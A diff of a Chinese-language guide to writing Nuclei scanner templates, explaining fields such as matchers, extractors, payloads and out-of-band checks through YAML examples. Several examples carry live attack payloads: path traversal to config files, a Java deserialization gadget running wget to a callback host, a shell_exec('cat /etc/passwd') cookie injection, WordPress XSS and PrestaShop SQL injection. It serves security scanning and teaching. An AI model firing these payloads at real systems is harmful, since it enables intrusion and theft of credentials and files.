@@ -1,123 +1,239 @@
-官方文档 : https://nuclei.projectdiscovery.io/templating-guide
+官方文档：https://docs.nuclei.sh/getting-started/overview
 
-nuclei 2.9.1 更新把模版格式改变了，后续nuclei版本要大于等于 291 不然可能解析不了模版格式
-- https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.1
-- https://github.com/projectdiscovery/nuclei/issues/3055
+nuclei 2.9.1 版本更新了模板格式。如果使用的是较旧的 nuclei 版本，可能无法解析新的模板格式。
+建议将 nuclei 版本升级至 2.9.1 或更高版本以确保正确解析模板格式。
 
-----------------------------分割线----------------------------
+ ===========================示例模板===========================
+id: template-id
 
-Get : 发送一个GET请求
+info:
+  name: Template Name
+  author: test
+  severity: info
+  description: 漏洞详情描述
+  reference:
+    - https://Template.nuclei.sh
+  # 元数据节点，与 uncover 集成的格式如下：<engine>-query: '<query>'
+  metadata:
+    max-request: 2
+    fofa-query: 'body="公司"'
+    shodan-query: 'vuln:CVE-2021-26855'
+    hunter-query: 'web.body="公司"'
+  tags: tags
+
+# 自定义模版变量，自2.6.9版本开始支持
+variables:
+  first_1: "{{rand_int(8, 20)}}"
+  first_2: "{{rand_int(100, 101)}}"
+
 http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
-
-----------------------------分割线----------------------------
-
-POST : 发送一个POST请求
-http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/sys/ui/extend/varkind/custom.jsp"
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-    body: 'var={"body":{"file":"file:///etc/passwd"}}'
-
-----------------------------分割线----------------------------
-
-RAW : 解析 raw 格式请求
-http:
+  # 解析 raw 格式请求
   - raw:
-      - |
-        POST /ispirit/interface/gateway.php HTTP/1.1
+      - |-
+        POST /{{Path}} HTTP/1.1
         Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+        Content-Type: application/json
+        
+        {"pageNum":1,"pageSize":{{PageSize}}}
 
-        json={"url":"/general/../../mysql5/my.ini"}
+    payloads:
+      # header: helpers/wordlists/header.txt
+      Path: 
+        - 'api/selectContentManagePage'
+      PageSize:
+        - "{{first_1}}"
+        - "{{first_2}}"
+    attack: clusterbomb		# 定义HTTP模糊攻击类型，可用类型： batteringram,pitchfork,clusterbomb
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          # 检查Cookie的MD5校验和是否包含在大写的请求体中
+          - "contains(toupper(body), md5(cookie))"
+          - "contains(header, 'application/json')"
+          - "contains(body, 'pageSize')"
+          - "contains(body_1, 'pageSize') && contains(body_2, 'pageNum')"
+          - "status_code == 200"
+          - "status_code_1 == 404 && status_code_2 == 200"
+        condition: and
 
-----------------------------分割线----------------------------
+      - type: dsl
+        dsl:
+          # 检测相应包的长度
+          - "len(body_1) != 0"
+          # 基于DSL的持续时间匹配器，当响应时间与定义的持续时间匹配时返回true，示例为大于等于6秒
+          - 'duration>=6'
+        condition: and
 
-stop-at-first-match : 大意就是一个模板里有多个扫描路径,当第一个命中时,自动停止后面几个路径的扫描,当然这个不会影响其他模板.
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
-      - "{{BaseURL}}/login"
-      - "{{BaseURL}}/main"
-      - "{{BaseURL}}/index"
+      # 匹配变量
+      - type: word
+        part: body
+        words:
+          - "{{first_2}}"
 
-    stop-at-first-match: true
+      # Interactsh匹配器，需要和使用 {{interactsh_response}}
+      # 可匹配 interactsh_protocol、interactsh_request和 interactsh_response 三处
 
-----------------------------分割线----------------------------
+      # 确认HTTP交互
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "http"
 
-OOB : 自 Nuclei v2.3.6 发行以来，Nuclei 支持使用 interact.sh API 内置自动请求关联来实现基于 OOB 的漏洞扫描。
+      # 确认检索/etc/passwd文件
+      - type: regex
+        part: interactsh_request 
+        regex:
+          - "root:[x*]:0:0:"
+
+      # 确认DNS交互
+      - type: word
+        part: interactsh_response 
+        words:
+          - "dns"
+
+      # 二进制流匹配
+      - type: binary
+        binary:
+          - "504B0304" # zip archive
+          - "526172211A070100" # RAR archive version 5.0
+          - "FD377A585A0000" # xz tar.xz archive
+        condition: or # 指定单个匹配器内多个条件的与或关系
+        part: body
+
+      - type: word
+        encoding: hex
+        words:
+          - "50494e47"
+        part: body
+
+      # 否定匹配器，对匹配器结果进行取反
+      - type: word
+        words:
+          - "PHPSESSID"
+        part: header
+        negative: true
+
+    extractors:
+      - type: regex
+        # 为提取的信息命名，方便调用，可省略
+        name: api
+        part: body
+        # 避免在终端中打印提取的值，使用动态变量时必须添加此标志
+        internal: true
+        regex:
+          - "(?m)[0-9]{3,10}\\.[0-9]+"
+
+ ----------------------------分割线----------------------------
+# 嵌套表达式
+❌ {{url_decode({{base64_decode('SGVsbG8=')}})}}
+✔ {{url_decode(base64_decode('SGVsbG8='))}}
+
+# 如果需要在 extractor 中使用,比如将 extractor 提取的变量值 test 进行处理
+{{url_decode(base64_decode('{{test}}'))}}
+
+ ----------------------------分割线----------------------------
+# 自 Nuclei v2.3.6 发行以来，Nuclei 支持使用 interact.sh API 内置自动请求关联来实现基于 OOB 的漏洞扫描
 http:
   - raw:
       - |
         GET /plugins/servlet/oauth/users/icon-uri?consumerUri={{interactsh-url}} HTTP/1.1
         Host: {{Hostname}}
 
-----------------------------分割线----------------------------
+ ----------------------------分割线----------------------------
+ # JAVA反序列化: https://docs.nuclei.sh/template-guide/helper-functions#deserialization-helper-functions
+http:
+  - raw:
+      - |
+        POST /index.faces;jsessionid=x HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
 
-JAVA反序列化 : https://nuclei.projectdiscovery.io/templating-guide/helper-functions/#deserialization-helper-functions
-raw:
-  -  |
-    POST /index.faces;jsessionid=x HTTP/1.1
-    Host: {{Hostname}}
-    Accept-Encoding: gzip, deflate
-    Content-Length: 1882
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-    Connection: close
-    Content-Type: application/x-www-form-urlencoded
+        javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
 
-    javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
-
-----------------------------分割线----------------------------
-
-skip-variables-check : 当你的请求内容里包含 {{ 时,会被 nuclei 解析为变量,加这个就是告诉nuclei不要解析.
+ ----------------------------分割线----------------------------
+ # 发送一个GET请求
 http:
   - method: GET
     path:
-      - "{{BaseURL}}"
+      - "{{BaseURL}}/actuator/env"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/thumbs.db"
+      - "{{BaseURL}}/.svn/wc.db"
+    # 发送一些头部信息给服务器的示例
     headers:
+      X-Client-IP: 127.0.0.1
+      X-Remote-IP: 127.0.0.1
+      X-Remote-Addr: 127.0.0.1
+      X-Forwarded-For: 127.0.0.1
+      X-Originating-IP: 127.0.0.1
       Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"
 
+    # skip-variables-check 可以使 nuclei 不要解析请求内容中 `{{` 为变量
     skip-variables-check: true
 
-----------------------------分割线----------------------------
+    # 如果模板中包含多个扫描路径，当第一个路径匹配成功时，会自动停止后续路径的扫描，这不会影响其他模板
+    stop-at-first-match: true
 
-嵌套表达式
-❌ {{url_decode({{base64_decode('SGVsbG8=')}})}}
-✔ {{url_decode(base64_decode('SGVsbG8='))}}
+    # 单位 bytes- 从服务器响应中读取的最大值
+    max-size: 500
 
-如果需要在 extractor 中使用,比如将 extractor 提取的变量值 test 进行处理
-{{url_decode(base64_decode('{{test}}'))}}
-
-----------------------------分割线----------------------------
-
-自定义模版变量 : 自 2.6.9 版本开始支持
-variables:
-  a1: "{{to_lower(rand_base(5))}}"
+  ----------------------------分割线----------------------------
+id: wp-related-post-xss
 
 http:
+  # 发送一个POST请求
+  - method: POST
+    path: 
+      - '{{RootURL}}/wp-login.php'
+    headers:
+       Content-Type: application/x-www-form-urlencoded
+    body: 'log={{username}}&pwd={{password}}&wp-submit=Log+In'
+
   - method: GET
     path:
-      - "{{BaseURL}}/?test={{a1}}"
+      - '{{RootURL}}/wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3Ep'
+
+    # cookie-reuse 参数为 true，在多个请求之间维护基于 cookie 的会话，该参数接受布尔类型的输入，默认值为 false。
+    cookie-reuse: true
+
+    # 请求条件与匹配器中的DSL表达式一起使用。它们允许逻辑表达式包含跨多个请求/响应的条件。
+    # 在模板中添加 "req-condition: true" 选项。响应的属性可以使用 "<请求编号>" 后缀来引用特定的响应，例如 status_code_1、status_code_3 或 body_2。
+    req-condition: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(header, 'text/html')"
+          - "contains(body_1, '<img src=x onerror=alert(document.domain)>&action=edit') && contains(body_2, 'All Posts</a>')"
+          - "status_code == 200"
+        condition: and
+
+ ----------------------------分割线----------------------------
+ # @timeout 请求注解
+id: PrestaShop_Product_Comments_SQL_Injection_CVE-2020-26248
+
+http:
+  - raw:
+      - |
+        # @timeout 是请求注解的一种，⽤于覆盖默认的请求超时时间
+        @timeout: 20s
+        GET /index.php?fc=module&module=productcomments&controller=CommentGrade&id_products%5B%5D=(select*from(select(sleep(6)))a) HTTP/1.1
+        Host: {{Hostname}}
 
     matchers:
-      - type: word
-        words:
-          - "{{a1}}"
+      - type: dsl
+        dsl:
+          - 'duration>=6 && status_code == 200'
+          - 'contains(content_type, "application/json") && contains(body, "average_grade")'
+        condition: and
 
-----------------------------分割线----------------------------
-
-self-contained : 这个用的比较局限,一般就是用于批量检测 API 可用性的,举个例子,你通过信息泄露获得了一个 API_Key 但你不知道这个是哪个服务的 APIkey,没有特征,那么就只能找哪些官方API接口一个一个试,看哪一个平台可以生效,就是这个意思。
+ ----------------------------分割线----------------------------
+ # "self-contained"通常在批量检测API可用性时使用
+ # 假设你通过信息泄露获得了一个API密钥，但不知道这个密钥属于哪个服务，也没有其他特征可供参考。这时，你只能逐个尝试各个官方API接口，看哪个平台能够成功验证该密钥。
 id: example-self-contained-input
-
-info:
-  name: example-self-contained
-  author: pdteam
-  severity: info
 
 self-contained: true
 http:
@@ -125,44 +241,3 @@ http:
       - |
         GET https://example.com:443/gg HTTP/1.1
         Host: example.com:443
-
-----------------------------分割线----------------------------
-
-文件协议 : 文件模板默认读取的文件大小1GB
-file:
-  - extensions:
-      - all
-
-    extractors:
-      - type: regex
-        regex:
-          - '"type": "service_account"'
-
-----------------------------分割线----------------------------
-
-网络层
-tcp:
-  - host:
-      - '{{Hostname}}'
-      - '{{Host}}:22'
-
-    inputs:
-      - data: "\n"
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        part: body
-        regex:
-          - 'SSH\-([0-9.-A-Za-z_ ]+)'
-
-----------------------------分割线----------------------------
-
-读取大小
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}/thumbs.db"
-      - "{{BaseURL}}/.svn/wc.db"
-
-    max-size: 500 # Size in bytes - Max Size to read from server response
